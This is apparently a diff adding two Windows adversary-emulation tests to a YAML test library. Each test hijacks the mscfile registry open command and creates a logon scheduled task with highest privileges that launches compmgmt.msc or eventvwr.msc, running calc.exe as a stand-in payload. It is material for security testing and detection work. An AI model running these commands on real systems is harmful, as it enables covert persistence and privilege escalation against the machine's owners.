@@ -282,3 +282,61 @@ atomic_tests:
     cleanup_command: |
       "PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\#{target} -accepteula -s "cmd.exe"
       "PathToAtomicsFolder\..\ExternalPayloads\GhostTask.exe" \\#{target} delete #{task_name} > nul
+      
+- name: Scheduled Task Persistence via CompMgmt.msc
+  auto_generated_guid: 8fcfa3d5-ea7d-4e1c-bd3e-3c4ed315b7d2
+  description: |
+    Adds persistence by abusing `compmgmt.msc` via a scheduled task.
+    When the Computer Management console is opened, it will run a malicious payload (in this case, `calc.exe`). 
+    This technique abuses scheduled tasks and registry modifications to hijack legitimate system processes.
+  supported_platforms:
+  - windows
+  input_arguments:
+    task_name:
+      description: Name of the newly-created scheduled task
+      type: string
+      default: CompMgmtBypass
+    payload:
+      description: Command you want the task to execute
+      type: string
+      default: calc.exe
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
+      schtasks /Create /TN "#{task_name}" /TR "compmgmt.msc" /SC ONLOGON /RL HIGHEST /F
+      ECHO Let's open the Computer Management console now...
+      compmgmt.msc
+    cleanup_command: |
+      reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
+      schtasks /Delete /TN "#{task_name}" /F
+
+- name: Scheduled Task Persistence via Eventviewer.msc
+  auto_generated_guid: 02124c37-767e-4b76-9383-c9fc366d9d4c
+  description: |
+    Adds persistence by abusing `eventviewer.msc` via a scheduled task.
+    When the eventviewer console is opened, it will run a malicious payload (in this case, `calc.exe`). 
+  supported_platforms:
+  - windows
+  input_arguments:
+    task_name:
+      description: Name of the newly-created scheduled task
+      type: string
+      default: EventViewerBypass
+    payload:
+      description: Command you want the task to execute
+      type: string
+      default: calc.exe
+  executor:
+    name: command_prompt
+    elevation_required: true
+    command: |
+      reg add "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /ve /t REG_EXPAND_SZ /d "c:\windows\System32\#{payload}" /f
+      schtasks /Create /TN "#{task_name}" /TR "eventvwr.msc" /SC ONLOGON /RL HIGHEST /F
+      ECHO Let's run the schedule task ...
+      schtasks /Run /TN "EventViewerBypass"
+    cleanup_command: |
+      reg delete "HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command" /f
+      schtasks /Delete /TN "#{task_name}" /F
+   
